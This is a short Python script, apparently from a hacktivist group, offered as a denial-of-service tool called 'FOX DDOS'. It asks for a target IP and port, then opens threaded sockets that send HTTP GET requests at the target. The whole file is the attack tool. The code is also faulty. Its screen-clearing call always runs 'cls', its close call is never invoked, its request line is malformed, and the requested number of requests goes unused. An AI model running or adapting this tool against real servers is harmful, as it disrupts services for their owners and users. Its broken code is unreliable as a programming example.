
import socket
import os
from colorama import Fore, init
import threading
import time
import sys

init()
# Variables
Counter = 0
DefaultPort = 80
Reset = Fore.RESET


def banner():

    os.system("cls" or "clear")
    print(Fore.CYAN+"""
                                                    ███████╗ ██████╗ ██╗  ██╗    ██████╗ ██████╗  ██████╗ ███████╗
                                                    ██╔════╝██╔═══██╗╚██╗██╔╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
                                                    █████╗  ██║   ██║ ╚███╔╝     ██║  ██║██║  ██║██║   ██║███████╗
                                                    ██╔══╝  ██║   ██║ ██╔██╗     ██║  ██║██║  ██║██║   ██║╚════██║
                                                    ██║     ╚██████╔╝██╔╝ ██╗    ██████╔╝██████╔╝╚██████╔╝███████║
                                                    ╚═╝      ╚═════╝ ╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                                                        Coded By: ALiReZa-VaKeR
                                                                            IranAnonymous.com
                                                                                V 1.0
    """+Reset)


banner()
# INPUTS
Target = input(Fore.GREEN+"Enter the target IP => "+Reset)

Port = input(Fore.GREEN+"Enter the target port (Default: 80) => "+Reset)

if (Port == "" or not Port):
    Port = DefaultPort
else:
    Port = int(Port)

Request_Number = int(input(Fore.GREEN+"Enter your request number => "+Reset))


def Attack():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((Target, Port))
        s.sendto(("GET /"+Target+"HTTP/1.1\r\n").encode("ascii"), (Target, Port))
        s.sendto(("Host : "+Target+"\r\n\r\n").encode("ascii"), (Target, Port))

        global Counter
        Counter += 1

        print(f"{Fore.GREEN} Packet {str(Counter)} sent! {Reset}")

        s.close
    except:
        print(Fore.RED+"There is an error in the Attack!", Reset)


# Progress
for i in range(5):

    sys.stdout.write(Fore.LIGHTBLUE_EX+"[%-1s] %d%%" % ('#'*i, 20*i)+Reset)

    sys.stdout.write('\n')

    time.sleep(0.20)

print("Start Attack...")
try:
    for i in range(2):
        thread = threading.Thread(target=Attack)
        thread.start()
except:
    print(Fore.RED+"There is an error in the Loop!", Reset)
